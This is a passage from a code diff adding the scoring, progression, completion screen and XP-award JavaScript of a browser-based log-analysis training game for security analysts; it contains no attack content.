+            } else if (wasFlagged && !isMalicious) {
+                row.classList.add('wrong-flag');
+                flagScore -= 5;
+                flagsWrong++;
+            } else if (!wasFlagged && isMalicious) {
+                row.classList.add('missed-flag');
+            }
+        });
+
+        /* Score questions */
+        let qScore = 0;
+        let questionsCorrect = 0;
+        const questionsArea = document.getElementById('questions-area');
+
+        scn.questions.forEach((q, qi) => {
+            const selected = questionSelections[qi];
+            const block = questionsArea.querySelectorAll('.question-block')[qi];
+            const options = block.querySelectorAll('.q-option');
+
+            /* Highlight correct answer */
+            options[q.correct].classList.add('correct-ans');
+
+            if (selected === undefined) {
+                /* No answer — no penalty */
+            } else if (selected === q.correct) {
+                qScore += 15;
+                questionsCorrect++;
+            } else {
+                options[selected].classList.add('wrong-ans');
+            }
+        });
+
+        /* Update totals */
+        const roundTotal = Math.max(0, flagScore + qScore);
+        const roundMax = scn.flaggableIds.length * 10 + scn.questions.length * 15;
+        State.totalScore += roundTotal;
+        State.maxScore   += roundMax;
+        State.totalFlagsCorrect    += flagsCorrect;
+        State.totalQuestionsCorrect += questionsCorrect;
+
+        /* Show score box */
+        const missedFlags = scn.flaggableIds.length - flagsCorrect;
+        const box = document.getElementById('round-score-box');
+        box.innerHTML = `
+            <div class="rs-row"><span class="rs-label">Correct flags (+10 each)</span><span class="rs-val">+${flagsCorrect * 10}</span></div>
+            <div class="rs-row"><span class="rs-label">Wrong flags (-5 each)</span><span class="rs-val neg">${flagsWrong > 0 ? '-' + (flagsWrong * 5) : '0'}</span></div>
+            <div class="rs-row"><span class="rs-label">Missed flags</span><span class="rs-val neg">${missedFlags}</span></div>
+            <div class="rs-row"><span class="rs-label">Questions correct (${questionsCorrect}/${scn.questions.length})</span><span class="rs-val">+${qScore}</span></div>
+            <div class="rs-divider"></div>
+            <div class="rs-row"><span class="rs-label">Round Score</span><span class="rs-total">${roundTotal} / ${roundMax}</span></div>
+            <div class="rs-row" style="margin-top:4px"><span class="rs-label">Cumulative</span><span class="rs-val">${State.totalScore} pts</span></div>
+        `;
+        box.classList.add('visible');
+
+        /* Update header score */
+        document.getElementById('hm-score').textContent = State.totalScore;
+
+        /* Hide submit, show next */
+        document.getElementById('btn-submit').classList.remove('visible');
+        document.getElementById('btn-next').classList.add('visible');
+
+        /* Disable question inputs */
+        questionsArea.querySelectorAll('input').forEach(i => { i.disabled = true; });
+        questionsArea.querySelectorAll('.q-option').forEach(l => { l.style.pointerEvents = 'none'; });
+
+        /* Yellow = missed flag label */
+        document.querySelectorAll('.log-entry.missed-flag').forEach(r => {
+            r.querySelector('.log-flag-icon').innerHTML = '&#9888;';
+            r.querySelector('.log-flag-icon').title = 'Missed — should have been flagged';
+        });
+    }
+
+    /* ============================================================
+       NEXT SCENARIO
+    ============================================================ */
+    function nextScenario() {
+        const next = State.currentScenario + 1;
+        if (next >= SCENARIOS.length) {
+            showCompletion();
+        } else {
+            /* Mark dot as done */
+            document.getElementById(`dot-${State.currentScenario}`).classList.remove('active');
+            document.getElementById(`dot-${State.currentScenario}`).classList.add('done');
+            document.getElementById(`dot-${next}`).classList.add('active');
+            loadScenario(next);
+            /* Scroll analysis panel to top */
+            document.getElementById('analysis-panel').scrollTop = 0;
+            document.getElementById('log-viewer').scrollTop = 0;
+        }
+    }
+
+    /* ============================================================
+       PROGRESS DOTS
+    ============================================================ */
+    function updateDots(activeIdx) {
+        for (let i = 0; i < 5; i++) {
+            const dot = document.getElementById(`dot-${i}`);
+            dot.classList.remove('active', 'done');
+            if (i < activeIdx) dot.classList.add('done');
+            else if (i === activeIdx) dot.classList.add('active');
+        }
+    }
+
+    /* ============================================================
+       COMPLETION SCREEN
+    ============================================================ */
+    function showCompletion() {
+        const maxPossible = State.maxScore;
+        const total       = State.totalScore;
+        const pct         = maxPossible > 0 ? Math.round((total / maxPossible) * 100) : 0;
+
+        let rank = 'Junior Analyst';
+        if (pct >= 90)      rank = 'Lead Threat Hunter';
+        else if (pct >= 75) rank = 'Senior Analyst';
+        else if (pct >= 50) rank = 'SOC Analyst';
+
+        /* Populate completion screen */
+        document.getElementById('complete-sub').textContent = `Incident timeline reviewed. All 5 scenarios complete.`;
+        document.getElementById('rank-title-display').textContent  = rank;
+        document.getElementById('score-pct-display').textContent   = `${pct}%`;
+        document.getElementById('rank-score-display').textContent  = `${total} / ${maxPossible} points`;
+        document.getElementById('cb-flags').textContent     = State.totalFlagsCorrect;
+        document.getElementById('cb-questions').textContent = State.totalQuestionsCorrect;
+
+        document.getElementById('complete-screen').style.display = 'flex';
+
+        /* Animate bar after paint */
+        setTimeout(() => {
+            document.getElementById('score-bar-fill').style.width = `${pct}%`;
+        }, 120);
+
+        /* ---- XP + Achievement ---- */
+        awardXPAndAchievements(total, maxPossible, rank);
+    }
+
+    /* ============================================================
+       XP + ACHIEVEMENT AWARD
+    ============================================================ */
+    function awardXPAndAchievements(totalScore, maxScore, rankTitle) {
+        /* Only award XP once */
+        if (!localStorage.getItem('game_loganalysis_xp_awarded')) {
+            const currentXP = parseInt(localStorage.getItem('hexworth_xp') || '0', 10);
+            localStorage.setItem('hexworth_xp', (currentXP + 75).toString());
+            localStorage.setItem('game_loganalysis_xp_awarded', 'true');
+
+            /* Firestore sync if available */
+            if (typeof FirestoreManager !== 'undefined' && FirestoreManager.addXP) {
+                const uid = localStorage.getItem('hexworth_uid');
+                if (uid) FirestoreManager.addXP(uid, 75, 'Log Analysis Lab Complete');
+            }
+        }
+
+        /* Achievement unlock */
+        if (typeof AchievementManager !== 'undefined') {
+            AchievementManager.unlock('game_loganalysis');
+        }
+
+        /* Game tracker */
+        if (typeof GameTracker !== 'undefined') {
+            GameTracker.record('loganalysis', {
+                score:    totalScore,
+                maxScore: maxScore,
+                rank:     rankTitle
+            });
+        }
+
+        /* XP badge display */
+        const badge = document.getElementById('xp-badge-display');
+        if (localStorage.getItem('game_loganalysis_xp_awarded')) {
+            badge.textContent = '+75 XP AWARDED';
+        }
+    }
+    </script>
+</body>
+</html>
